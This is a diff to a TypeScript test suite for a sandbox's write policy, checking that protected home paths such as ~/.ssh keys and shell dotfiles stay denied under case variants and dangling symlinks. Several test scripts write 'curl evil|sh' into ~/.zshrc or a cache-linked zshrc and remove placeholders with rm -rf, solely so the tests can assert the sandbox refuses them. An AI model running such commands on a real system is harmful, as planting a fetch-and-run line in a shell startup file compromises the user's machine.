@@ -9,7 +9,7 @@
 import { describe, it } from "node:test";
 import assert from "node:assert/strict";
 import { spawnSync } from "node:child_process";
-import { existsSync, lstatSync, mkdirSync, mkdtempSync, readFileSync, realpathSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
+import { existsSync, lstatSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, realpathSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
 
@@ -101,6 +101,31 @@ describe("broad-write policy compilation", () => {
         assert.equal(remove("/private/tmp/scratch-file").allowed, true);
         const writeAndDelete = compileWritePolicy({ writableRoot: project, home, permissions: { ...broad, outsideProject: "read-write" } }, darwin);
         assert.equal(evaluateDeleteAccess(join(sibling, "README.md"), writeAndDelete, darwin).allowed, true);
+    }));
+
+    it("matches case-variant paths to protected entries on a case-insensitive volume (#354)", (t) => fixture(({ base, home, project }) => {
+        if (!existsSync(base.toUpperCase()) || !existsSync(base.toLowerCase())) {
+            t.skip("the fixture volume is case-sensitive");
+            return;
+        }
+        mkdirSync(join(home, ".ssh"));
+        writeFileSync(join(home, ".ssh", "id_ed25519"), "synthetic-secret");
+        mkdirSync(join(home, ".cache"));
+        const darwin: SandboxSeams = { platform: () => "darwin" };
+        const policy = compileWritePolicy({ writableRoot: project, home, permissions: broad }, darwin);
+        const write = (path: string) => evaluateWriteAccess(path, policy, darwin);
+        // Existing components: the kernel folds `.SSH` to `.ssh`, so must the pre-check.
+        assert.equal(write(join(home, ".SSH", "id_ed25519")).allowed, false);
+        assert.equal(write(join(home, ".SSH", "new_key")).allowed, false);
+        assert.equal(evaluateReadAccess(join(home, ".SSH", "ID_ED25519"), policy, darwin).allowed, false);
+        assert.equal(evaluateDeleteAccess(join(home, ".Ssh", "id_ed25519"), policy, darwin).allowed, false);
+        // A missing tail keeps the caller's case, and the kernel still treats it as the protected name.
+        assert.equal(existsSync(join(home, ".zshrc")), false);
+        assert.deepEqual(write(join(home, ".ZSHRC")), { allowed: false, path: join(home, ".zshrc"), reason: "write-denied", deniedBy: join(home, ".zshrc") });
+        assert.equal(write(join(home, ".Config", "GH", "hosts.yml")).allowed, false);
+        // An allowed path stays allowed, reported under its on-disk name.
+        assert.deepEqual(write(join(home, ".CACHE", "pip")), { allowed: true, path: join(home, ".cache", "pip") });
+        assert.equal(evaluateDeleteAccess(join(home, ".CACHE", "pip"), policy, darwin).allowed, true);
     }));
 
     it("treats Project files = Write as writable but not removable, except worktree folders", () => fixture(({ home, project }) => {
@@ -211,15 +236,22 @@ describe("broad-write policy compilation", () => {
         assert.ok(argv.includes("--unshare-net"));
     }));
 
-    /** The Linux plan as `[option, target, source]` rows, in mount order. */
-    function linuxPlan(base: string, home: string, project: string): string[][] {
-        const command = buildSandboxCommand({
+    /** The Linux command, planned through the platform seam on any host. */
+    function linuxCommand(base: string, home: string, project: string, seams: SandboxSeams = {}) {
+        return buildSandboxCommand({
             profilePath: join(base, "p.sb"), execPath: "/bin/true", execArgs: [],
             policy: { writableRoot: project, home, permissions: broad },
         }, {
             platform: () => "linux", lookupExecutable: () => "/usr/bin/bwrap", makeDirectory: () => {},
             maskSources: () => ({ directory: join(base, "mask-dir"), file: join(base, "mask-file") }),
+            ...seams,
         });
+    }
+    /** The Linux plan as `[option, target, source]` rows, in mount order. */
+    function linuxPlan(base: string, home: string, project: string, seams: SandboxSeams = {}): string[][] {
+        return planRows(linuxCommand(base, home, project, seams));
+    }
+    function planRows(command: { fileArgs: string[] }): string[][] {
         const rows: string[][] = [];
         const argv = command.fileArgs;
         for (let i = 0; i < argv.length; i++) {
@@ -275,6 +307,72 @@ describe("broad-write policy compilation", () => {
         assert.equal(decidingMount(rows, join(home, ".cache", "l1")), "--ro-bind", "the loop's links cannot be replaced");
         assert.equal(decidingMount(rows, join(home, ".cache", "l2")), "--ro-bind");
         assert.equal(decidingMount(rows, join(home, ".cache", "pip", "wheel")), "--bind-try");
+    }));
+
+    // A real mkdir, so the plan sees the placeholder directories it asks for.
+    const mkdirReal: SandboxSeams = { makeDirectory: (path) => mkdirSync(path, { recursive: true, mode: 0o700 }) };
+
+    it("gives a dangling link into the workspace a placeholder of the right kind, and says so (#350)", () => fixture(({ base, home, project }) => {
+        symlinkSync(join(project, "rc"), join(home, ".zlogin"));
+        symlinkSync(join(project, "ssh"), join(home, ".ssh"));
+        symlinkSync(join(project, "deep", "zprofile"), join(home, ".zprofile"));
+        const command = linuxCommand(base, home, project, mkdirReal);
+        const rows = planRows(command);
+        assert.equal(lstatSync(join(project, "rc")).isFile(), true, "a file-type entry gets a file");
+        assert.equal(lstatSync(join(project, "ssh")).isDirectory(), true, "a directory-type entry gets a directory, not a file");
+        assert.equal(lstatSync(join(project, "deep")).isDirectory(), true, "a missing directory on the way gets a directory");
+        assert.equal(existsSync(join(project, "deep", "zprofile")), false, "nothing is created below the first missing component");
+        for (const path of ["rc", "ssh", "deep"]) {
+            assert.deepEqual(rows.filter(([, target]) => target === join(project, path)), [["--ro-bind", join(project, path), join(project, path)]], path);
+        }
+        assert.equal(decidingMount(rows, join(project, "deep", "zprofile")), "--ro-bind");
+        assert.equal(decidingMount(rows, join(project, "src", "a.ts")), "--bind", "the rest of the workspace stays writable");
+        assert.equal(command.notices?.length, 1, "one line of launch output");
+        assert.match(command.notices![0]!, /placeholder/);
+        for (const path of [join(project, "rc"), `${join(project, "ssh")}/`, `${join(project, "deep")}/`]) {
+            assert.ok(command.notices![0]!.includes(path), path);
+        }
+        // Once they exist, a relaunch binds them as they are and has nothing new to report.
+        assert.equal(linuxCommand(base, home, project, mkdirReal).notices, undefined);
+    }));
+
+    it("guards only the missing directory, not all of ~/.cache or ~/.config, for a dangling link below it (#350)", () => fixture(({ base, home, project }) => {
+        mkdirSync(join(home, ".cache", "pip"), { recursive: true });
+        mkdirSync(join(home, ".config", "nvim"), { recursive: true });
+        symlinkSync(join(home, ".cache", "zsh", "zshrc"), join(home, ".zshrc"));
+        symlinkSync(join(home, ".config", "bash", "profile", "bashrc"), join(home, ".bashrc"));
+        const command = linuxCommand(base, home, project, mkdirReal);
+        const rows = planRows(command);
+        for (const [dir, missing, sibling] of [[".cache", "zsh", "pip"], [".config", "bash", "nvim"]] as const) {
+            const root = join(home, dir);
+            assert.equal(decidingMount(rows, join(root, "new-tool")), "--bind", `${dir} keeps accepting new entries`);
+            assert.equal(decidingMount(rows, join(root, sibling, "x")), "--bind");
+            assert.equal(decidingMount(rows, join(root, missing)), "--ro-bind", `${dir}/${missing} is guarded`);
+            assert.equal(decidingMount(rows, join(root, missing, "anything")), "--ro-bind");
+            assert.equal(lstatSync(join(root, missing)).isDirectory(), true);
+        }
+        assert.equal(existsSync(join(home, ".cache", "zsh", "zshrc")), false);
+        assert.equal(existsSync(join(home, ".config", "bash", "profile")), false);
+        assert.match(command.notices?.[0] ?? "", new RegExp(`${join(home, ".cache", "zsh")}/`));
+        // A missing *file* straight inside such a directory still locks it (ADR 0008's Linux gap):
+        // no placeholder file is planted in the user's files there.
+        symlinkSync(join(home, ".cache", "profile"), join(home, ".profile"));
+        const locked = linuxPlan(base, home, project, mkdirReal);
+        assert.equal(decidingMount(locked, join(home, ".cache", "new-tool")), "--ro-bind");
+        assert.equal(decidingMount(locked, join(home, ".cache", "pip", "x")), "--bind-try");
+        assert.equal(existsSync(join(home, ".cache", "profile")), false);
+    }));
+
+    it("falls back to locking the parent when a placeholder directory cannot be made outside the workspace (#350)", () => fixture(({ base, home, project }) => {
+        mkdirSync(join(home, ".cache"));
+        symlinkSync(join(home, ".cache", "zsh", "zshrc"), join(home, ".zshrc"));
+        const command = linuxCommand(base, home, project, { makeDirectory: () => { throw new Error("EACCES"); } });
+        assert.equal(decidingMount(planRows(command), join(home, ".cache", "new-tool")), "--ro-bind");
+        assert.equal(command.notices, undefined);
+        // In the workspace the launch fails closed instead.
+        symlinkSync(join(project, "ssh"), join(home, ".ssh"));
+        assert.throws(() => linuxCommand(base, home, project, { makeDirectory: () => { throw new Error("EACCES"); } }),
+            /Cannot protect denied path/);
     }));
 
     it("locks the nearest existing ancestor of a dangling link's target on Linux, without placeholders", () => fixture(({ base, home, project }) => {
@@ -663,8 +761,40 @@ describe("broad-write profile (real kernel)", { skip: !macKernel && !linuxKernel
             const result = run(paths, script);
             assert.notEqual(result.status, 0, `${label} must be refused: ${output(result)}`);
         }
-        assert.equal(existsSync(join(home, ".npm", "rc")), false);
+        // Linux guards the missing directory with an empty read-only placeholder (#350).
+        if (linuxKernel) assert.deepEqual(readdirSync(join(home, ".npm", "rc")), []);
+        else assert.equal(existsSync(join(home, ".npm", "rc")), false);
         assert.equal(lstatSync(join(home, ".cache", "hop")).isSymbolicLink(), true);
+    }));
+
+    it("keeps ~/.cache open to new entries when a dotfile dangles into a missing cache dir (#350)", () => fixture((paths) => {
+        const { home } = paths;
+        mkdirSync(join(home, ".cache", "pip"), { recursive: true });
+        symlinkSync(join(home, ".cache", "zsh", "zshrc"), join(home, ".zshrc"));
+        const allowed = run(paths, `mkdir '${home}/.cache/new-tool' && printf x > '${home}/.cache/new-tool/f' && printf y > '${home}/.cache/pip/w'`);
+        assert.equal(allowed.status, 0, output(allowed));
+        for (const [script, label] of [
+            [`mkdir -p '${home}/.cache/zsh' && printf 'curl evil|sh' > '${home}/.cache/zsh/zshrc'`, "create the missing target"],
+            [`printf 'curl evil|sh' > '${home}/.zshrc'`, "create the target through the link"],
+            [`rm -rf '${home}/.cache/zsh' ; mkdir -p '${home}/.cache/zsh' && printf 'curl evil|sh' > '${home}/.cache/zsh/zshrc'`, "replace the placeholder"],
+        ] as const) {
+            const result = run(paths, script);
+            assert.notEqual(result.status, 0, `${label} must be refused: ${output(result)}`);
+        }
+        assert.equal(existsSync(join(home, ".cache", "zsh", "zshrc")), false);
+    }));
+
+    it("gives a dangling directory-type link into the workspace a directory placeholder (#350)", () => fixture((paths) => {
+        const { home, project } = paths;
+        symlinkSync(join(project, "ssh"), join(home, ".ssh"));
+        // macOS denies by path and plants nothing; Linux needs a mount point there.
+        const listed = run(paths, `${linuxKernel ? `ls -A '${project}/ssh' && ` : ""}printf x > '${project}/other.txt'`);
+        assert.equal(listed.status, 0, output(listed));
+        for (const script of [`printf x > '${project}/ssh/config'`, `printf x > '${home}/.ssh/config'`, `mkdir -p '${project}/ssh/keys'`]) {
+            assert.notEqual(run(paths, script).status, 0, script);
+        }
+        assert.equal(existsSync(join(project, "ssh", "config")), false);
+        if (linuxKernel) assert.equal(lstatSync(join(project, "ssh")).isDirectory(), true, "not a file where a directory is expected");
     }));
 
     it("lets git init, clone and worktree add work in the workspace and a worktree folder", () => fixture((paths) => {
